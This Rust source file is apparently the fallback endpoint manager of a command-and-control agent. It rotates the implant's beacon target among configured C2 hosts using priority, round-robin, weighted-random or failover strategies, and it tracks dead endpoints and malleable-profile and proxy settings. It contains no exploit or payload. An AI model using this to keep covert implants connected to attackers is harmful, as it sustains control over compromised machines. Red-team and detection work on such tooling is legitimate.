// src/agent/fallback.rs
//
// Fallback endpoint manager. Selects which C2 endpoint to try based on
// the configured strategy, tracks failures, and handles dead-endpoint
// rotation. Supports four strategies:
//
//   Priority    — always try lowest-priority first, fall to next on failure
//   RoundRobin  — cycle through in order
//   Random      — weighted random selection
//   Failover    — use first until dead, then permanently switch to next

use std::time::Instant;
use rand::Rng;

use crate::common::{
    C2Config, FallbackEndpoint, FallbackStrategy,
    TransportProtocol, MalleableProfile, ProxyConfig,
};

/// Runtime state for a single endpoint.
struct EndpointState {
    endpoint: FallbackEndpoint,
    consecutive_failures: u32,
    dead_since: Option<Instant>,
    total_successes: u64,
    total_failures: u64,
}

impl EndpointState {
    fn is_dead(&self, dead_time_secs: u64) -> bool {
        if let Some(since) = self.dead_since {
            since.elapsed().as_secs() < dead_time_secs
        } else {
            false
        }
    }

    fn record_failure(&mut self, max_failures: u32) {
        self.consecutive_failures += 1;
        self.total_failures += 1;
        if self.consecutive_failures >= max_failures {
            self.dead_since = Some(Instant::now());
        }
    }

    fn record_success(&mut self) {
        self.consecutive_failures = 0;
        self.dead_since = None;
        self.total_successes += 1;
    }
}

/// Resolved connection parameters for one attempt.
#[derive(Clone, Debug)]
pub struct ResolvedEndpoint {
    pub host: String,
    pub port: u16,
    pub transport: TransportProtocol,
    pub profile: MalleableProfile,
    pub proxy: ProxyConfig,
    pub index: usize,
}

/// Manages fallback endpoint selection and failure tracking.
pub struct FallbackManager {
    states: Vec<EndpointState>,
    strategy: FallbackStrategy,
    dead_time_secs: u64,
    round_robin_index: usize,
    failover_index: usize,
}

impl FallbackManager {
    /// Build from a C2Config. If no fallback endpoints are configured,
    /// creates a single endpoint from `c2_host`/`tunnel_port`.
    pub fn from_config(config: &C2Config) -> Self {
        let mut endpoints = config.fallback.endpoints.clone();

        // If no fallback endpoints, use the primary host as the only one
        if endpoints.is_empty() {
            endpoints.push(FallbackEndpoint {
                host: config.c2_host.clone(),
                port: config.tunnel_port,
                transport: config.transport.clone(),
                profile: None,
                proxy: None,
                priority: 0,
                weight: 1,
                max_failures: 5,
            });
        }

        // Sort by priority for Priority/Failover strategies
        endpoints.sort_by_key(|e| e.priority);

        let states = endpoints.into_iter().map(|ep| EndpointState {
            endpoint: ep,
            consecutive_failures: 0,
            dead_since: None,
            total_successes: 0,
            total_failures: 0,
        }).collect();

        Self {
            states,
            strategy: config.fallback.strategy.clone(),
            dead_time_secs: config.fallback.dead_time_secs,
            round_robin_index: 0,
            failover_index: 0,
        }
    }

    /// Select the next endpoint to try. Returns None if all endpoints are dead.
    pub fn next_endpoint(&mut self, config: &C2Config) -> Option<ResolvedEndpoint> {
        match self.strategy {
            FallbackStrategy::Priority => self.select_priority(config),
            FallbackStrategy::RoundRobin => self.select_round_robin(config),
            FallbackStrategy::Random => self.select_random(config),
            FallbackStrategy::Failover => self.select_failover(config),
        }
    }

    /// Mark the last-used endpoint as failed.
    pub fn record_failure(&mut self, index: usize) {
        if let Some(state) = self.states.get_mut(index) {
            let max = state.endpoint.max_failures;
            state.record_failure(max);
        }
    }

    /// Mark the last-used endpoint as successful.
    pub fn record_success(&mut self, index: usize) {
        if let Some(state) = self.states.get_mut(index) {
            state.record_success();
        }
    }

    /// Check if all endpoints are dead. If so, only reset those whose
    /// configured dead time has fully elapsed. This prevents tight retry
    /// loops: when every endpoint is down and still within its dead time,
    /// no endpoint is reset and `select()` returns `None`, letting the
    /// caller back off with its normal sleep interval instead of hammering
    /// every endpoint in a hot loop.
    pub fn check_and_reset_if_all_dead(&mut self) {
        let all_dead = self.states.iter().all(|s| s.is_dead(self.dead_time_secs));
        if !all_dead {
            return; // At least one endpoint is alive — nothing to do
        }
        // All are dead. Selectively reset only those whose dead time expired.
        for state in &mut self.states {
            if let Some(since) = state.dead_since {
                if since.elapsed().as_secs() >= self.dead_time_secs {
                    state.dead_since = None;
                    state.consecutive_failures = 0;
                }
            }
        }
    }

    /// Get a summary of endpoint health for diagnostics.
    pub fn status_summary(&self) -> String {
        self.states.iter().enumerate().map(|(i, s)| {
            let status = if s.is_dead(self.dead_time_secs) { "DEAD" }
                else if s.consecutive_failures > 0 { "DEGRADED" }
                else { "OK" };
            format!("[{}] {}:{} ({:?}) — {} (ok:{} fail:{})",
                i, s.endpoint.host, s.endpoint.port, s.endpoint.transport,
                status, s.total_successes, s.total_failures)
        }).collect::<Vec<_>>().join("\n")
    }

    // ── Strategy implementations ───────────────────────────────────────

    fn resolve(&self, index: usize, config: &C2Config) -> ResolvedEndpoint {
        let ep = &self.states[index].endpoint;
        ResolvedEndpoint {
            host: ep.host.clone(),
            port: ep.port,
            transport: ep.transport.clone(),
            profile: ep.profile.clone().unwrap_or_else(|| config.profile.clone()),
            proxy: ep.proxy.clone().unwrap_or_else(|| config.proxy.clone()),
            index,
        }
    }

    fn select_priority(&mut self, config: &C2Config) -> Option<ResolvedEndpoint> {
        self.check_and_reset_if_all_dead();
        // Already sorted by priority; pick first non-dead
        for (i, state) in self.states.iter().enumerate() {
            if !state.is_dead(self.dead_time_secs) {
                return Some(self.resolve(i, config));
            }
        }
        // All dead and reset didn't help (shouldn't happen)
        Some(self.resolve(0, config))
    }

    fn select_round_robin(&mut self, config: &C2Config) -> Option<ResolvedEndpoint> {
        self.check_and_reset_if_all_dead();
        let len = self.states.len();
        for _ in 0..len {
            let idx = self.round_robin_index % len;
            self.round_robin_index += 1;
            if !self.states[idx].is_dead(self.dead_time_secs) {
                return Some(self.resolve(idx, config));
            }
        }
        Some(self.resolve(0, config))
    }

    fn select_random(&mut self, config: &C2Config) -> Option<ResolvedEndpoint> {
        self.check_and_reset_if_all_dead();
        let alive: Vec<usize> = self.states.iter().enumerate()
            .filter(|(_, s)| !s.is_dead(self.dead_time_secs))
            .map(|(i, _)| i)
            .collect();

        if alive.is_empty() {
            return Some(self.resolve(0, config));
        }

        // Weighted selection
        let total_weight: u32 = alive.iter()
            .map(|&i| self.states[i].endpoint.weight)
            .sum();

        if total_weight == 0 {
            let idx = alive[rand::thread_rng().gen_range(0..alive.len())];
            return Some(self.resolve(idx, config));
        }

        let mut roll = rand::thread_rng().gen_range(0..total_weight);
        for &idx in &alive {
            let w = self.states[idx].endpoint.weight;
            if roll < w {
                return Some(self.resolve(idx, config));
            }
            roll -= w;
        }

        Some(self.resolve(alive[0], config))
    }

    fn select_failover(&mut self, config: &C2Config) -> Option<ResolvedEndpoint> {
        // In failover, once an endpoint is dead, we move to the next permanently
        let len = self.states.len();
        while self.failover_index < len {
            let idx = self.failover_index;
            if !self.states[idx].is_dead(self.dead_time_secs) {
                return Some(self.resolve(idx, config));
            }
            self.failover_index += 1;
        }
        // All exhausted — wrap around
        self.failover_index = 0;
        self.check_and_reset_if_all_dead();
        Some(self.resolve(0, config))
    }
}
